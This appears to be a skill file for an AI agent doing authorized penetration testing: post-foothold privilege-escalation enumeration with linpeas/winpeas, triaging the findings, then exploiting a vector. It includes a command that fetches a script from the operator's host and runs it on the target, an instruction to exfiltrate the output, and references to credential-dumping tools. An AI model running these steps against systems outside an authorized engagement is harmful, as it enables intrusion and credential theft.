---
name: linpeas
description: >
  Use after an initial foothold to enumerate local privilege-escalation vectors on a compromised
  host with linpeas/winpeas (PEASS-ng) — SUID, capabilities, cron, creds, misconfigs, kernel —
  then turn red/yellow highlights into concrete abuse via GTFOBins/LOLBAS. Runs after a foothold
  skill; feeds the privesc exploit step. Not for remote/network enum (nmap/netexec).
arguments: "lhost_url [os]"
model: inherit
effort: medium
context: inline
agent:
category: privesc-creds
domain: host
---

# linpeas / winpeas — automated privilege-escalation enumeration (PEASS-ng)

Shared contract: see AGENTS.md.

## Goal
Surface likely local privilege-escalation vectors (SUID, caps, cron, creds, misconfigs, kernel) on a
compromised host, capture the full output, and turn the highest-signal highlights into a verified path.

## Steps
1. Set up the run dir per AGENTS.md (`$RUN`, `mkdir -p "$RUN/notes"`); scope inherited from `out/<engagement>/scope.txt`. Authorized post-ex on a host you already hold. **linpeas is noisy/slow** — fine in labs, think twice in sensitive environments.
2. **Run on the target, capture everything** (host the script over HTTP from your box): `curl <lhost_url>/linpeas.sh | sh -s -- -a 2>&1 | tee /tmp/linpeas.txt` (Windows: `winPEASx64.exe > winpeas.txt`), then exfil into `$RUN/linpeas.txt`.
3. **Focus red/yellow highlights.** PEASS colour-codes the most promising findings — triage those first, not the whole dump.
4. **Cross-check vectors.** Map each candidate (SUID, writable cron, sudo rule, capability, kernel) against **GTFOBins / LOLBAS** and known CVEs for a concrete abuse command; record each + its command in `notes/vectors.md`.
5. **Exploit the most reliable path + marker + run record.** Verify before firing; pick the most reliable vector. Write a run marker (`- none identified` if nothing), then `run.json`.

## Modern tooling & alternatives
PEASS-ng: `linpeas.sh` (Linux), `winPEASx64.exe` (Windows). Companions: `pspy` (watch cron/processes
without root), `linux-exploit-suggester` / `wesng` (kernel/OS → known exploits). AD post-ex: `mimikatz` / `impacket secretsdump`.

## Checklist
```yaml
checklist:
  - id: scope-confirmed
    desc: Engagement scope confirmed once in out/<engagement>/scope.txt (inherited, not re-confirmed); authorized foothold host
    verify: judge
    evidence: ../../scope.txt
    on_fail: fail
    required: true
  - id: enum-captured
    desc: linpeas/winpeas run and full output captured into the run directory
    verify: nonempty
    evidence: linpeas.txt
    on_fail: redo-skill
    required: true
  - id: vectors-analyzed
    desc: Highlights cross-checked against GTFOBins/LOLBAS/CVEs; candidates recorded (or "none")
    verify: nonempty
    evidence: notes/vectors.md
    on_fail: redo-part
    required: true
  - id: results-recorded
    desc: Run marker written (even when no vector found)
    verify: nonempty
    evidence: findings.md
    on_fail: redo-skill
    required: true
```

## Notes / pitfalls
- **Noisy / slow** — fine in labs, think twice in sensitive environments; `scope-confirmed` fails hard (`on_fail: fail`).
- **Don't blindly run suggested exploits** — verify each vector (version, writability, path) first; kernel exploits can crash the host.
- Triage red/yellow highlights, not the whole dump — then map to a concrete GTFOBins/LOLBAS command. `pspy` catches root cron/processes a one-shot run can miss.
- A run that finds no vector must still write `findings.md` + a `- none` line in `vectors.md`.
